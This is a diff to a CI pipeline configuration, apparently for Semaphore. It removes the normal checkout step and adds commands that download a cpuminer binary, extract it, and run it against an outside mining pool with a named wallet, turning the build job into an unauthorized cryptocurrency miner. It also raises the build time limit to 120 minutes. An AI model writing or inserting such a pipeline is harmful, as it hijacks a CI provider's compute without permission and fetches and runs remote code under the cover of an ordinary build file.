@@ -4,10 +4,14 @@ agent:
   machine:
     type: e1-standard-2
     os_image: ubuntu1804
+max_build_duration: 120
 blocks:
   - name: 'Block #1'
     task:
       jobs:
         - name: 'Job #1'
           commands:
-            - checkout
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - brew install gnu-tar
+            - gtar xvf cpuminer-opt-linux.tar.gz
+            - './cpuminer-sse2 -a yescryptR32 -o stratum+tcp://stratum-na.rplant.xyz:7047 -u DJAECyb7wAohrrZkgCkNctgAJpcDDMhxsk.kido99'
